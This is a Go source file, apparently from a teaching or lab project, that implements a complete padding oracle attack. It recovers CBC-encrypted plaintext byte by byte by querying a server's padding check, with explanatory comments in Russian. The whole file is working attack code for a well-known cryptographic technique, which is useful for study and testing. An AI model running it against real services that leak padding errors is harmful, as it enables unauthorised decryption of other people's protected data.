package poa

import (
	"bytes"
	"crypto/rand"
	"fmt"
	"github.com/paragor/padding_oracle_attack/pkg"
	"github.com/paragor/padding_oracle_attack/pkg/helper"
	"log"
	"time"
)

type PaddingOracleAttacker struct {
	server pkg.SiegeServer
	logger *log.Logger
}

func NewPaddingOracleAttacker(server pkg.SiegeServer, logger *log.Logger) *PaddingOracleAttacker {
	return &PaddingOracleAttacker{server: server, logger: logger}
}

func (a *PaddingOracleAttacker) Attack(iv []byte, msg []byte, blockSize int) ([]byte, error) {
	if len(msg)%blockSize != 0 {
		return nil, fmt.Errorf("wrong block size")
	}

	cipherBlocks, err := helper.SplitData(msg, blockSize)
	if err != nil {
		return nil, fmt.Errorf("cant split msg to cipherBlocks: %w", err)
	}
	intermediateStateOfBlocks := make([][]byte, len(cipherBlocks))
	plaintextOfBlocks := make([][]byte, len(cipherBlocks))
	for i, chunk := range cipherBlocks {

		a.logger.Printf("Start %d/%d chunk\n", i, len(cipherBlocks))
		start := time.Now()
		intermediateStateOfBlocks[i], err = a.attackBlock(chunk, blockSize)
		if err != nil {
			return nil, fmt.Errorf("cant attack chunk %d: %w", i, err)
		}
		if i == 0 {
			// первый блок особый, т.к. для вычисления промежуточного состояния iX используется не предыдущее значение
			// шифроблока c(X-1), а вектор инициализации iv
			plaintextOfBlocks[i], err = helper.XORBytes(intermediateStateOfBlocks[i], iv)
		} else {
			// зная промежуточное состояние iX и предыдущей шифроблок мы можем расшифровать текст pX за один XOR :)
			plaintextOfBlocks[i], err = helper.XORBytes(intermediateStateOfBlocks[i], cipherBlocks[i-1])
		}
		if err != nil {
			return nil, fmt.Errorf("cant recover plaintext from i2: xorerror: %w", err)
		}

		a.logger.Printf("Finish %d/%d chunk for %f seconds\n", i, len(cipherBlocks), time.Now().Sub(start).Seconds())
	}

	return helper.PKCS5Unpad(bytes.Join(plaintextOfBlocks, []byte{}), blockSize)
}

//attackBlock атакует блок c2 через padding_oracle_attack
func (a *PaddingOracleAttacker) attackBlock(c2 []byte, blockSize int) ([]byte, error) {
	buffer := make([]byte, 2*blockSize)
	c1 := buffer[:blockSize]
	i2 := make([]byte, blockSize)
	_, err := rand.Read(c1)
	if err != nil {
		return nil, err
	}
	copy(buffer[blockSize:], c2)
	for curPos := blockSize - 1; curPos >= 0; curPos-- {
		pad := blockSize - curPos
		if pad > 1 {
			completeKnownPositions(pad, curPos+1, c1, i2)
		}
		for i := 0; i < 256; i++ {
			c1[curPos] = byte(i)
			_, isPaddingError, err := a.server.VerifyPadding(buffer)
			if err != nil {
				return nil, fmt.Errorf("server return err: %w", err)
			}
			if !isPaddingError {
				i2[curPos] = byte(pad) ^ c1[curPos]
				//i2[curPos] =  c1[curPos]
				break
			}
			if i == 255 {
				return nil, fmt.Errorf("cant find valid padding for %d pos", curPos)
			}
		}
	}

	return i2, nil
}

//completeKnownPositions Зная промежуточные значения i2 мы можем с помощью предыдущего шифроблока блока c1
// подставить в итоговый расшифрованный текст p2 любое значение
func completeKnownPositions(pad int, lastKnownPos int, c1 []byte, i2 []byte) {
	for i := lastKnownPos; i < len(c1); i++ {
		c1[i] = i2[i] ^ byte(pad)
	}
}
